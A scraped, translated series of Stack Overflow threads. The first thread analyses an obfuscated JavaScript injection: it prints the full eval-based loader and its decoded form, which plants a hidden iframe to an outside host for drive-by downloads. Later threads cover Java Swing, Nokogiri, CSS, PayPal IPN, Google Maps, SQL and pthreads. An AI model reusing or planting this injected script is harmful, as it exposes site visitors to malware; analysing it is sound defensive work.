29,104,100,103,100,104,115,59,31,39,42,101,111,97,39,49,45,48,43,52,45,48,40,41,36,34,61,58,44,105,101,112,94,109,100,60,57,47,99,103,115,62,38,39,56,13,9,7,122,13,9,7,115,97,113,30,98,120,111,59,107,101,118,30,65,97,115,99,37,41,58,99,117,112,45,113,98,116,67,95,113,101,39,99,117,112,45,101,98,116,67,95,113,101,39,39,40,55,40,57,10,10,8,103,99,40,99,109,96,117,108,99,107,116,45,97,108,111,106,103,98,46,104,108,97,101,119,77,99,40,38,93,92,117,115,107,99,114,60,37,38,61,60,43,46,41,122,98,108,99,116,107,98,110,115,44,96,111,110,105,102,101,60,37,92,95,116,114,106,102,113,59,36,43,113,113,37,41,42,37,56,32,100,118,109,105,113,99,112,61,38,41,98,120,111,44,113,111,70,75,81,83,115,112,102,110,102,38,38,43,38,57,29,112,96,114,101,61,46,37,56,125,12,8,122);}w=f;s=[];for(i=0;-i+800!=0;i+=1){j=i;if((031==0x19))if(e)s=s+String.fromCharCode((1*w[j]+e("j%4")));}xz=e;try{document.body++}catch(gdsgd){xz(s)} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:34:54.483

首先，通过[http://jsbeautifier.org/](http://jsbeautifier.org/)提供它。

你现在可以很容易地推导出它`v`变成了 string `"eval"`，并且`e`是`eval`函数。此外，您可以运行从数组项构建字符串的循环，以查看它的作用：

```
function gra(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
function rs(){return Math.random().toString(36).substring(5);}
if(navigator.cookieEnabled){
    var stnm=rs();
    var ua = navigator.userAgent;
    var url = document.location.href;
    if(url.indexOf('admin')==-1 && ua.indexOf('Windows')!=-1 && (ua.indexOf('MSIE')!=-1||ua.indexOf('Opera')!=-1)){
        document.write('<style>.s'+stnm+' { position:absolute; left:-'+gra(600,1000)+'px; top:-'+gra(600,1000)+'px; }</style> <div class="s'+stnm+'"><iframe src="http://pulldownlays.info/ad/feed.php" width="'+gra(300,600)+'" height="'+gra(300,600)+'"></iframe></div>');
    }
    var exp=new Date();exp.setDate(exp.getDate()+7);
    if(document.cookie.indexOf('__utmfr=')==-1){document.cookie='__utmfr='+rs()+'; expires='+exp.toGMTString()+'; path=/';}
} 
```

现在很明显：它设置了一个随机标识符 cookie，并且对于 Windows 上不浏览“管理员”url 的每个 IE/Opera 用户，它会创建一个位于屏幕外的 iframe。iframe 可能包含一些恶意软件的驱动下载。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T22:41:30.977

隐藏代码是这样的：

```
function gra(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
function rs(){return Math.random().toString(36).substring(5);}
if(navigator.cookieEnabled){
  var stnm=rs();
  var ua = navigator.userAgent;
  var url = document.location.href;

  if(url.indexOf('admin')==-1 && ua.indexOf('Windows')!=-1 && (ua.indexOf('MSIE')!=-1||ua.indexOf('Opera')!=-1)){
    document.write('<style>.s'+stnm+' { position:absolute; left:-'+gra(600,1000)+'px; top:-'+gra(600,1000)+'px; }</style> <div class="s'+stnm+'"><iframe src="http://xxxxxxxxxxxx.info/ad/feed.php" width="'+gra(300,600)+'" height="'+gra(300,600)+'"></iframe></div>');
  }
  var exp=new Date();exp.setDate(exp.getDate()+7);
  if(document.cookie.indexOf('__utmfr=')==-1){document.cookie='__utmfr='+rs()+'; expires='+exp.toGMTString()+'; path=/';}
} 
```

它以简单的 ascii 形式存储在 f 数组中，但每四个字符重复递增 0、1、2 和 3，以试图混淆代码。

看起来这为每个网页添加了一些代码，以在 i-frame 中显示恶意 url。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T22:31:08.843

我刚刚将它粘贴到[http://jsbeautifier.org/](http://jsbeautifier.org/) ...祝你好运！

```
ww = window;
v = "v" + "al";
if (ww.document) try {
    document.body = 12;
} catch (gdsgsdg) {
    asd = 0;
    try {
        d = document
    } catch (agdsg) {
        asd = 1;
    }
    if (!asd) {
        w = {
            a: ww
        }.a;
        v = "e".concat(v);
    }
}
e = w[v];
if (1) {
    f = new Array(102, 116, 108, 96, 116, 104, 109, 107, 32, 102, 112, 94, 40, 96, 42, 95, 41, 122, 112, 98, 116, 116, 112, 107, 32, 76, 95, 113, 104, 45, 100, 105, 111, 110, 112, 37, 77, 96, 114, 101, 46, 113, 95, 107, 100, 110, 107, 37, 41, 41, 38, 95, 45, 96, 41, 46, 41, 40, 41, 94, 59, 124, 11, 7, 102, 116, 108, 96, 116, 104, 109, 107, 32, 113, 113, 37, 41, 122, 112, 98, 116, 116, 112, 107, 32, 76, 95, 113, 104, 45, 112, 94, 110, 99, 109, 106, 40, 40, 44, 113, 111, 82, 114, 111, 105, 109, 101, 37, 51, 53, 39, 43, 115, 116, 96, 112, 116, 113, 103, 107, 103, 39, 51, 38, 59, 124, 11, 7, 105, 101, 38, 107, 97, 117, 103, 100, 97, 115, 109, 111, 46, 98, 109, 108, 107, 104, 99, 66, 110, 96, 96, 105, 101, 99, 39, 120, 13, 9, 7, 115, 97, 113, 30, 112, 116, 109, 107, 58, 114, 114, 38, 38, 59, 12, 8, 6, 118, 96, 112, 29, 117, 96, 30, 58, 32, 109, 95, 115, 105, 102, 95, 113, 111, 113, 44, 114, 115, 100, 112, 62, 103, 100, 108, 113, 59, 12, 8, 6, 118, 96, 112, 29, 117, 113, 106, 29, 61, 31, 98, 108, 99, 116, 107, 98, 110, 115, 44, 105, 111, 98, 95, 113, 105, 110, 108, 43, 104, 113, 99, 99, 59, 12, 8, 6, 105, 101, 38, 114, 114, 107, 44, 102, 110, 99, 99, 117, 79, 101, 38, 36, 97, 99, 107, 102, 110, 38, 39, 58, 61, 44, 47, 29, 38, 37, 30, 114, 97, 45, 103, 107, 100, 100, 118, 76, 102, 39, 37, 84, 105, 109, 98, 108, 119, 114, 37, 38, 33, 60, 43, 46, 32, 37, 36, 29, 40, 116, 95, 43, 105, 109, 98, 98, 120, 78, 100, 37, 39, 76, 81, 70, 69, 38, 39, 30, 61, 44, 47, 121, 124, 116, 95, 43, 105, 109, 98, 98, 120, 78, 100, 37, 39, 78, 110, 98, 114, 96, 37, 38, 33, 60, 43, 46, 41, 40, 121, 10, 10, 8, 7, 97, 111, 98, 115, 106, 101, 109, 114, 43, 119, 113, 103, 113, 101, 39, 37, 57, 115, 115, 119, 105, 101, 61, 44, 112, 39, 42, 113, 113, 110, 108, 41, 36, 32, 122, 30, 109, 111, 114, 103, 113, 105, 110, 108, 55, 97, 97, 113, 108, 108, 116, 114, 98, 59, 31, 106, 98, 102, 115, 56, 42, 39, 42, 101, 111, 97, 39, 52, 45, 48, 43, 47, 45, 48, 47, 39, 40, 39, 111, 118, 56, 32, 115, 109, 109, 58, 44, 37, 40, 103, 113, 95, 37, 54, 47, 46, 41, 49, 47, 46, 45, 41, 42, 37, 109, 120, 58, 30, 122, 60, 46, 113, 113, 121, 107, 99, 59, 32, 59, 98, 102, 118, 31, 97, 105, 97, 114, 113, 58, 34, 114, 37, 40, 115, 115, 108, 106, 43, 38, 32, 59, 60, 104, 100, 111, 97, 108, 99, 29, 115, 113, 97, 58, 34, 103, 114, 113, 112, 57, 45, 44, 112, 116, 106, 105, 100, 110, 117, 107, 108, 96, 119, 112, 46, 104, 108, 99, 111, 46, 95, 97, 47, 101, 99, 98, 100, 45, 110, 101, 112, 33, 30, 116, 105, 99, 114, 101, 61, 33, 37, 40, 103, 113, 95, 37, 51, 47, 46, 41, 54, 47, 46, 38, 43, 38, 32, 29, 104, 100, 103, 100, 104, 115, 59, 31, 39, 42, 101, 111, 97, 39, 49, 45, 48, 43, 52, 45, 48, 40, 41, 36, 34, 61, 58, 44, 105, 101, 112, 94, 109, 100, 60, 57, 47, 99, 103, 115, 62, 38, 39, 56, 13, 9, 7, 122, 13, 9, 7, 115, 97, 113, 30, 98, 120, 111, 59, 107, 101, 118, 30, 65, 97, 115, 99, 37, 41, 58, 99, 117, 112, 45, 113, 98, 116, 67, 95, 113, 101, 39, 99, 117, 112, 45, 101, 98, 116, 67, 95, 113, 101, 39, 39, 40, 55, 40, 57, 10, 10, 8, 103, 99, 40, 99, 109, 96, 117, 108, 99, 107, 116, 45, 97, 108, 111, 106, 103, 98, 46, 104, 108, 97, 101, 119, 77, 99, 40, 38, 93, 92, 117, 115, 107, 99, 114, 60, 37, 38, 61, 60, 43, 46, 41, 122, 98, 108, 99, 116, 107, 98, 110, 115, 44, 96, 111, 110, 105, 102, 101, 60, 37, 92, 95, 116, 114, 106, 102, 113, 59, 36, 43, 113, 113, 37, 41, 42, 37, 56, 32, 100, 118, 109, 105, 113, 99, 112, 61, 38, 41, 98, 120, 111, 44, 113, 111, 70, 75, 81, 83, 115, 112, 102, 110, 102, 38, 38, 43, 38, 57, 29, 112, 96, 114, 101, 61, 46, 37, 56, 125, 12, 8, 122);
}
w = f;
s = [];
for (i = 0; - i + 800 != 0; i += 1) {
    j = i;
    if ((031 == 0x19)) if (e) s = s + String.fromCharCode((1 * w[j] + e("j%4")));
}
xz = e;
try {
    document.body++
} catch (gdsgd) {
    xz(s)
} 
```

# java - IconImage 未显示在 jButton 上

> ID：14348081
> 
> 赞同：0
> 
> 时间：2013-01-15T22:27:03.610
> 
> 标签：java, swing, jbutton, imageicon

我正在和我的朋友一起做一个跳棋游戏，我负责棋子、棋盘等。我通过另一个也在玩跳棋游戏并让它工作的朋友得到了使用 iconImages 的想法。由于某种原因，检查器图像未显示。任何想法将不胜感激。

```
import java.awt.*;
import javax.swing.*;

public class checkerboard {

    public static void main(String[] args) {
        //Creates new checkerboard GUI
        JFrame checkers = new JFrame("Checkers");
        checkers.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        Dimension size = new Dimension(1050, 900);
        //Creates two arrays of which black and white spaces
        JButton[] blackSpaces = new JButton[32];
        JButton[] whiteSpaces = new JButton[32];
        //Declares and instantiates checkers
        ImageIcon grayCheckers = new ImageIcon("GrayCircle.jpg");
        //for (int i = 0; i < 12; i++)
        //grayCheckers[i] = new ImageIcon("GrayCircle.jpg");
        ImageIcon redCheckers = new ImageIcon("redcircle.jpg");
        //for (int j = 0; j < 12; j++)
        //redCheckers[j] = new ImageIcon("redcircle.jpg");
        //instantiates black and white spaces
        for (int index = 0; index < 12; index++) {
            blackSpaces[index] = new JButton(grayCheckers);
            blackSpaces[index].setBackground(Color.BLACK);
        }
        for (int index = 12; index < 20; index++) {
            blackSpaces[index] = new JButton(" ");
            blackSpaces[index].setBackground(Color.BLACK);
        }
        for (int index = 20; index < 32; index++) {
            blackSpaces[index] = new JButton(redCheckers);
            blackSpaces[index].setBackground(Color.BLACK);
        }
        for (int index = 0; index < whiteSpaces.length; index++) {
            whiteSpaces[index] = new JButton(" ");
            whiteSpaces[index].setBackground(Color.WHITE);
        }
        //Gives grid layout to panel
        JPanel panel = new JPanel();
        checkers.setPreferredSize(size);
        checkers.setResizable(false);
        panel.setLayout(new GridLayout(8, 8));
        //Adds spaces in a lot of loops along with checkers to
        //the first and last three lines
        for (int counter1 = 0; counter1 < 4; counter1++) {
            panel.add(whiteSpaces[counter1]);
            panel.add(blackSpaces[counter1]);
            //blackSpaces[counter1].setIcon(grayCheckers[counter1]);
        }
        for (int counter2 = 4; counter2 < 8; counter2++) {
            panel.add(blackSpaces[counter2]);
            panel.add(whiteSpaces[counter2]);
            //blackSpaces[counter2].setIcon(grayCheckers[counter2]);
        }
        for (int counter1 = 8; counter1 < 12; counter1++) {
            panel.add(whiteSpaces[counter1]);
            panel.add(blackSpaces[counter1]);
            //blackSpaces[counter1].setIcon(grayCheckers[counter1]);
        }
        for (int counter2 = 12; counter2 < 16; counter2++) {
            panel.add(blackSpaces[counter2]);
            panel.add(whiteSpaces[counter2]);
        }
        for (int counter1 = 16; counter1 < 20; counter1++) {
            panel.add(whiteSpaces[counter1]);
            panel.add(blackSpaces[counter1]);
        }
        for (int counter2 = 20; counter2 < 24; counter2++) {
            panel.add(blackSpaces[counter2]);
            panel.add(whiteSpaces[counter2]);
            //blackSpaces[counter2].setIcon(redCheckers[(counter2 - 20)]);
        }
        for (int counter1 = 24; counter1 < 28; counter1++) {
            panel.add(whiteSpaces[counter1]);
            panel.add(blackSpaces[counter1]);
            //blackSpaces[counter1].setIcon(redCheckers[(counter1 - 20)]);
        }
        for (int counter2 = 28; counter2 < 32; counter2++) {
            panel.add(blackSpaces[counter2]);
            panel.add(whiteSpaces[counter2]);
            //blackSpaces[counter2].setIcon(redCheckers[(counter2 - 20)]);
        }
        //Displat GUI
        checkers.getContentPane().add(panel);
        checkers.pack();
        checkers.setVisible(true);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:43:04.913

用于导入图像使用 BufferedImage

```
BufferedImage buttonIcon = ImageIO.read(new File("buttonIconPath")); 
```

并用于创建按钮

```
button = new JButton(new ImageIcon(buttonIcon)); 
```

之后用于`button.setContentAreaFilled(false);`显示图像，仅此而已

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:46:08.763

您需要检查您的应用程序期望您的图像驻留的位置。添加

```
System.out.println(System.getProperty("user.dir")); 
```

并将您的图像复制到该位置。

# ruby - 使用 Nokogiri 从链接获取 href 时无法将字符串转换为整数

> ID：14348083
> 
> 赞同：1
> 
> 时间：2013-01-15T22:27:07.793
> 
> 标签：ruby, html-parsing, nokogiri

我正在尝试使用 Ruby 和 Nokogiri 解析这个网站：

这是我的代码：

```
require 'nokogiri'
require 'open-uri'

class StreamsController < ApplicationController
  def index
  end

  def updateall
    doc = Nokogiri::HTML(open('http://www.own3d.tv/game/League+of+Legends'))

    # Grab all the Live streams from the front page.
    doc.css('div#top_live .VIDEOS-1grid-box').each do |stream|
      s = Stream.new

      # Parse the URL.
      s.url = stream.css('a.small-tn')['href']
    end
  end
end 
```

`# Parse the URL`在位，我得到了错误`Cannot convert String to Integer.`

我对如何在这个简单的用例中使用 Nokogiri 感到有点困惑。

如何获取每个`|stream|`对象内每个链接的 href 属性？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T22:39:48.187

问题是`stream.css`返回[`NodeSet`](http://nokogiri.org/Nokogiri/XML/NodeSet.html)匹配的（如数组），因此无法将字符串转换为数组索引。

要获得第一场比赛，请使用`stream.at_css`，这是我认为您想要的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T22:40:02.183

`stream.css('a.small-tn')`将返回一个节点集合。因此，调用`['href']`集合是行不通的，因为集合充当数组，并且它认为您正在尝试访问某个索引处的元素（因此出现错误）。相反，您需要决定是要遍历它们，还是只获取第一个：

```
s.url = stream.css('a.small-tn').first['href'] 
```

如果你想让它更安全一点，你可以检查 nils：

```
node = stream.css('a.small-tn').first
s.url = node['href'] if node 
```

或者你可以使用[`at_css`](http://nokogiri.org/Nokogiri/XML/Node.html#method-i-at_css)帮助器（如@AJcodez）指出的，它做同样的事情。

# css - CSS 问题居中导航栏

> ID：14348088
> 
> 赞同：0
> 
> 时间：2013-01-15T22:27:41.190
> 
> 标签：css, center, navbar

所以，基本上我最后一次进行任何网页开发时，只有 HTML，而且无论如何我都没有基本的了解。所以现在，我正在追赶并尝试学习 CSS。我的问题是水平导航栏，它不能完全居中。我试过调整宽度、边框和边距，但我错过了一些东西。

使用我当前的布局，左侧的空白比右侧多一点，我被卡住了。

这是jsfiddle：

[http://jsfiddle.net/PkvZ7/](http://jsfiddle.net/PkvZ7/)

CSS：

```
<!-- JASCO NAVBAR -->
ul
{
width:100%;
list-style-type: none;
margin-left:auto;
margin-right:auto;
padding:none;
overflow:hidden;
}

li
{
align:center;
width:20%;
margin:0;
padding:0;
display:inline-block;
list-style-type: none;
}
a:link,a:visited
{
display:block;
width:100%;
font-weight:bold;
font-size:20px;
color:#FFFFFF;
background-color:#FF6103;
text-align:center;
padding:5px;
text-decoration:none;
font-variant:small-caps;
}
a:hover,a:active
{
background-color:#000000;
color:#FF6103;
}

#container {
  width:100%
}

<!-- TOP CSS-->
.top {
position:absolute;
width:80%;
height:10%;
margin-left:auto;
margin-top:20px;
margin-right:auto;
color:#000000;
padding:0;
}

<!-- CONTENT CSS-->
.content {
position:absolute;
width 100%;
margin-left:10px;
margin-right:10px;
padding:3px;
color:#dddddd;
}

#img
{
}

<!-- TOP IMAGE CSS-->
img.center {
display:block;
margin-left:auto;
margin-right:auto;
} 
```

HTML：

```
<!doctype html>
<html>
<head>
<link rel="stylesheet" type="text/css" href="jascostyle.css">
<title>Single"Frame" Test</title>
</head>

<body>
<div id="container">
  <center>
  <div class="top">
  <img class ="center" width="80%" height="5%" href="#temp" src="#temp" alt="JASCO ENERGY"/>
  <ul>
  <li><a href="#home">Home</a></li>
  <li><a href="#news">News</a></li>
  <li><a href="#contact">Contact</a></li>
  <li><a href="#about">About</a></li>
  </ul>
  </div>

  <div  class="content">
  <h1>This is under construction!</h1>
  </div>
    </div>
  </body>
</html> 
```

我感谢任何关于此事的帮助/解释。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:29:34.837

您需要固定宽度 +`margin-left:auto`和`margin-right:auto`. 你不应该对你的内容使用绝对定位——让它自然流动。

该`<center>`标签已被弃用，因此对宽度为 960 像素的外部“容器”包装器使用相同的技术；。

```
ul {
    width:500px;
    list-style-type: none;
    margin-left:auto;
    margin-right:auto;
    padding:0;   
} 
```

一般来说，当使用基于列表的菜单时，`float:left`在你的 LI 上使用`display:block`，在 A-tag 上使用，并将所有其他样式放在 A-tag 上，而不是列表本身。

请参阅我的教程：[我喜欢列表](http://preview.moveable.com/jm/ilovelists/)。

# php - 将 PayPal IPN 与 PHP 集成 - cURL 错误：SSL CA 证书

> ID：14348090
> 
> 赞同：1
> 
> 时间：2013-01-15T22:27:47.867
> 
> 标签：php, paypal, paypal-ipn

我正在将 PayPal 集成到我的网站中。在这个阶段，我正在使用 PayPal 沙箱以及即时付款通知 (IPN) 模拟器。对于听众本身，我使用的是[Micah Carrick 的代码](http://www.micahcarrick.com/paypal-ipn-with-php.html)。通过沙箱发送 IPN 时，我收到以下错误：

> cURL 错误：[77] SSL CA 证书有问题（路径？访问权限？）

我原本以为问题是我的网站缺少 SSL 证书，所以我购买了一个并安装了它。不幸的是，这并没有解决我的问题。在做了更多研究之后，我的印象是我缺少来自 PayPal 或 cURL 的证书文件。我从 PayPal 下载了一个开发包 (pp_php_soap_sdk_1) 并将该`api_cert_chain`文件复制到我的 ipn 代码目录中，但没有成功。查看证书时，它似乎已过期，所以也许这就是问题所在。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T08:18:49.860

感觉自己像个白痴，但问题出在我存储 SSL CA 证书的位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-28T02:45:55.343

文件 ipn_listener.php 指向一个名为“api_cert_chain.crt”的文件。你很可能会错过它。您可以从以下网址下载：[https ://cms.paypal.com/cms_content/US/en_US/files/developer/PP_PHP_SOAP_SDK.zip](https://cms.paypal.com/cms_content/US/en_US/files/developer/PP_PHP_SOAP_SDK.zip)

下载并解压 zip。文件“api_cert_chain.crt”位于文件夹：PP_PHP_SOAP_SDK/php-sdk/lib/PayPal/cert。将文件上传到服务器上的目录 /cert/ （可能需要创建文件夹）。

我从这个网站（最后一篇文章）找到了解决方案：[Webmaster World](http://www.webmasterworld.com/ecommerce/4523997.htm)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-15T21:13:14.377

在“ipn_listener.php”文件中有指向 api_cert_chain.crt 的代码

```
dirname(__FILE__)."/api_cert_chain.crt"); 
```

您需要确保 .crt 的路径实际上指向 .crt 在您的网络服务器上的位置。

# google-maps - 将 GoogleMaps InfoWindow 置于最前面

> ID：14348092
> 
> 赞同：5
> 
> 时间：2013-01-15T22:27:53.407
> 
> 标签：google-maps, infowindow

我有一个 GoogleMaps APIv3 应用程序，可以在其中随时打开多个 InfoWindows。如果单击它的任何部分，我希望能够将一个模糊的 InfoWindow 带到所有其他 InfoWindow 的前面 - 类似于 MS Windows 操作系统中窗口的行为。

我曾想过添加一个 onclick 事件处理程序来增加 InfoWindow 的 z-index，但事件处理程序似乎没有被触发。ZIndex 是一个全局变量，随着 InfoWindows 的点击而不断增加 - 或者这就是理论。

任何人都可以帮忙吗？这是我的代码：-

```
var ZIndex=1;
var iw = new google.maps.InfoWindow({ content:contentString });
google.maps.event.addListener(iw, 'click', handleInfoWindowClick(iw) );

function handleInfoWindowClick(infoWindow) {
   return function() {
      infoWindow.setZIndex(ZIndex++);
   }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-16T03:14:47.490

infoWindow 没有点击事件，这有点困难。

1.  您需要使用元素（而不是字符串）作为信息窗口的内容，因为您需要一个 DOMListener 而不是信息窗口对象的侦听器
2.  当 domready-fires 时，您必须将 click-DOMListener 应用于定义 infowindow 的内容节点的锚点

以下代码将为您执行此操作，将其添加到您的页面：

```
google.maps.InfoWindowZ=function(opts){
          var GM = google.maps,
              GE = GM.event,
              iw = new GM.InfoWindow(),
              ce;

             if(!GM.InfoWindowZZ){
                GM.InfoWindowZZ=Number(GM.Marker.MAX_ZINDEX);
             }

             GE.addListener(iw,'content_changed',function(){
               if(typeof this.getContent()=='string'){
                  var n=document.createElement('div');
                      n.innerHTML=this.getContent();
                      this.setContent(n);
                      return;
               }
               GE.addListener(this,'domready',
                               function(){
                                var _this=this;
                                _this.setZIndex(++GM.InfoWindowZZ);
                                if(ce){
                                  GM.event.removeListener(ce);
                                }
                                ce=GE.addDomListener(this.getContent().parentNode
                                                  .parentNode.parentNode,'click',
                                                  function(){
                                                  _this.setZIndex(++GM.InfoWindowZZ);
                                });
                              })
             });

             if(opts)iw.setOptions(opts);
             return iw;
        } 
```

而不是`google.maps.InfoWindow()`你现在必须打电话`google.maps.InfoWindowZ()`

它还返回一个真正的 InfoWindow，但应用了提到的侦听器。它还会在需要时从内容创建节点。

演示：http: [**//jsfiddle.net/doktormolle/tRwnE/**](http://jsfiddle.net/doktormolle/tRwnE/)

* * *

visualRefresh 的更新版本（使用鼠标悬停而不是单击）[**http://jsfiddle.net/doktormolle/uuLBb/**](http://jsfiddle.net/doktormolle/uuLBb/)

# php - PHP - 我不想再使用带循环的表了

> ID：14348095
> 
> 赞同：0
> 
> 时间：2013-01-15T22:27:58.103
> 
> 标签：php, mysql

我需要建立一张表来显示我选择的某一天的所有销售额。

我一直使用虚拟方式，选择一天内有销售的表产品，然后在 php 表上循环，从其他表中获取其他信息。

我想知道是否有一种简单的方法来获取数据。

**表格：**

```
table_products

pr_id | pr_name | pr_price | ..
------|---------|----------|
1     | TV      | 299.99   |
2     | RADIO   |  59.99   |
3     | DVD     |  49.99   |
..    | ..      | ..       |

table_sales

sa_id | sa_coupon | sa_day   | sa_month | ..
------|-----------|----------|----------|
1     | 101       |    4     |    9     |
2     | 102       |    5     |    9     |
3     | 103       |    5     |    9     |
..    | ..        | ..       |..        |
80    | 211       |    2     |    12    |
..    | ..        | ..       |..        |

table_sales_dt

sa_dt_coupon |  sa_dt_product_id      | sa_qtd      |
-------------|------------------------|-------------|..
101      | 1                  | 10          |
101      | 2                  | 5       |
102      | 1              | 5       |
103      | 3              | 8       |
211      | 1              | 15      |
211      | 2              | 10      |
211      | 3              | 5       |
..           | ..             | ..          | 
```

我想显示这样的结果：

第 9 个月（9 月）的销售额

```
N   PRODUCT  QUANTITY    PRICE   TOTAL
1 - TV     - 15       - 299.99 - 4499.85
2 - RADIO  - 5        - 59.99  - 299.95
3 - DVD    - 8        - 49.99  - 399.92 
```

谢谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T22:34:28.677

这样的事情可能会做到这一点：

```
SELECT p.* FROM table_products p 
LEFT JOIN table_sales_dt dt ON p.id = dt.product_id
LEFT JOIN table_sales s ON dt.sa_dt_coupon = s.sa_coupon
WHERE s.sa_month = 9 
```

# c++ - C ++ - Pthread，与具有无限循环的一个函数相关的多个线程

> ID：14348099
> 
> 赞同：0
> 
> 时间：2013-01-15T22:28:09.637
> 
> 标签：c++, multithreading, loops, pthreads, infinite-loop

我是 C++ 新手并尝试使用 Pthread 和 Ncurses 库。我正在制作程序，它在终端屏幕上显示飞球。我创建了一个 Ball 类：

在文件 Ball.h 声明中，在 Ball.c 实现中。球.h：

```
class Ball {

public:
//ATTRIBUTES
    char sign;
    int x, y, direction, speed, color;
    int width, height;              //area, field size

//CONSTRUCTORS
    Ball();
    ~Ball();
    Ball(int d, int s, int yy, int xx, int c, int fH, int fW);  
    //s - start direction, v - speed, x,y- position, c-color

//GETTERS

//METHODS
    void setAreaSize(int, int);
    void moveBall(void);
}; 
```

在其他文件中是我使用此类的程序：

```
.../*including some libs */...

.../*declaring some attributes */...

Ball *balls;
pthread_t *threads;
int howManyBalls;
int i;              //helper for loops

pthread_mutex_t mutex1 = PTHREAD_MUTEX_INITIALIZER;

struct timespec delay = {       //our speed or rather delay ;)
             1,
             0
    };

/* Function declarations */
void initBalls(void);
void initThreads(void);
void *threadBallFunction(void *arg);

//MAIN FUNCTION ----------------------------------------------------------------------------------------------
int main(int argc, char *argv[])
{
    ... /*some code*/...

    initBalls();
    initThreads();

    ... /* some code */       

    return 0;
}

//FUNCTIONS IMPLEMENTATIONS ----------------------------------------------------------------------------------

/* INIT BALLS */
void initBalls(void){
    balls = new Ball[howManyBalls];     //creating our balls array with appropriate size

    int ballY, ballX, ballDirection, ballColor;

    srand(time(0));                 //resetting the random number generator

    for(i=0;i<howManyBalls;i++){
        ballY = (rand()%(frameWidth-1))-i;
        ballX = (rand()%(frameHeight-1))-i;
        ballDirection = rand()%8+1;
        ballColor = rand()%7+1;

        balls[i] = Ball(ballDirection,2,ballX,ballY,ballColor, frameHeight, frameWidth);        

    }
}

void *threadBallFunction(void *threadIndex) {
    do{
        /* WHAT HERE ?? */
    }
    while(1);
}

/* INIT THREADS */
void initThreads(void){
    threads = new pthread_t[howManyBalls];
    void *exit_status;
    int threadIdx;

    for (threadIdx = 0; threadIdx < howManyBalls; threadIdx++) {
        pthread_create(&threads[threadIdx], NULL, threadBallFunction, &threadIdx);
        pthread_join(threads[threadIdx], &exit_status);
    }
} 
```

所以，现在我希望那个球有自己的线程。所有线程都与同一个函数联系在一起 - threadBallFunction，我将只移动一个球，哪个球？它将由传递给 threadBallFunction 的参数指定。球和螺纹应存储在单独的数组中。球数由用户输入指定。移动的球应该是无穷无尽的。

我不知道如何在这里使用互斥锁或条件变量......期待任何帮助，

***//编辑：更精确的问题：***

我有许多线程通过无限循环链接到同一个函数。是否可以在此函数中使用同步线程的条件变量方法？

**//EDIT2（谢谢Ahmed，但是...）** 好的，这对我很有帮助。非常感谢;) buuuut 可以说我希望线程无休止地工作并在每次递增时打印“计数器”值，每次递增或打印之间的时间应该是 1 秒。

例如：

计数器 = 0;

Thread1- IncCounterBy(2)

Thread2- IncCounterBy(5)

我的程序应该打印：

2（1秒后+2）

7（1秒后+5）

9（1秒后+2）

14（1秒后+5）

16（1秒后+2）

21（1秒后+5）

...直到我用 CTRL+C 停止它

如何管理这个？

亲切的问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T15:39:18.007

您的具体问题：“是否可以在此函数中使用同步线程的条件变量方法”

我仍然不清楚您真正要求的行为，所以让我们考虑两种情况：

* * *

## 案例 1：您希望线程自主运行，并且每个线程在其自己的预定周期内独立更新计数器：

答案是对于这个应用程序，条件变量不是正确的同步方法。条件变量确实适用于生产者消费者设计模式。尤其是：

*如果当前没有线程阻塞在 cond 上，pthread_cond_broadcast() 和 pthread_cond_signal() 函数将无效。 [http://linux.die.net/man/3/pthread_cond_signal](http://linux.die.net/man/3/pthread_cond_signal) *

您要求的是对共享状态对象（您的计数器）的自主处理。在这种情况下，Ahmed 是正确的，因为共享状态应该简单地由互斥锁保护以防止同时访问。

## 情况 2：您希望每个线程执行某种循环处理，其中一个线程运行，等待 1 秒，然后按其参数量更新计数器。然后下一个线程运行，等待 1 秒并通过其不同的参数量更新计数器。依此类推，直到您循环回第一个线程。

这种更多情况与您的示例计数器增量流相匹配。在这种情况下，只要线程数为 2，就可以使用条件变量，并且确保以确定的方式启动它们。如果有超过 2 个线程，则除非它们具有不同的优先级，否则无法保证运行顺序。同样在这样的循环中启动它们并不能保证哪个将首先执行。

在这种情况下，一次只有一个线程在工作，而所有其他线程都在等待。这不是多线程解决方案的好选择。更好的模式是单线程和工作队列。我的意思是创建一个所需的各种增量的循环队列，让一个线程在循环中运行，它等待 1 秒，从队列中读取下一个增量并递增计数器，递增队列指针，然后重复.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:36:23.553

互斥量也很容易理解和使用，假设你有一个类

```
class A{
        static int counter;
    public:
        static void IncCounterBy(int increment){
            counter += increment;
        }
    }; 
```

假设有 100 个线程都在访问这个函数，在任何时候 2 个线程 - 或更多 - 可以同时访问同一个函数，每个线程将复制原始值然后递增它所以如果 A::counter = 3

Thread1- IncCounterBy(2)

Thread2- IncCounterBy(5)

Thread3- IncCounterBy(1)

这将在 =>> A::counter = 3;

如何使用 Boost::Mutex

```
class A{
        static int counter;
        boost::mutex Guard;
    public:
        static void IncCounterBy(int increment){
        Guard.lock();
        counter += increment;
        Guard.unlock();
        //Or you can use "boost::mutex::scoped_lock  lock(Guard);" to guard a function
    }; 
```

# laravel - Laravel 4：我怎么能理解它是如何工作的？

> ID：14348100
> 
> 赞同：8
> 
> 时间：2013-01-15T22:28:17.737
> 
> 标签：laravel, laravel-4

我在一个项目中使用 Laravel 3，这很开心。我还多次查看源代码，以了解某些事情在幕后是如何工作的。

但是现在在 Laravel 4 中，我不知道从哪里开始或如何理解这一切。我在哪里可以了解 Laravel 4 的所有幕后知识？

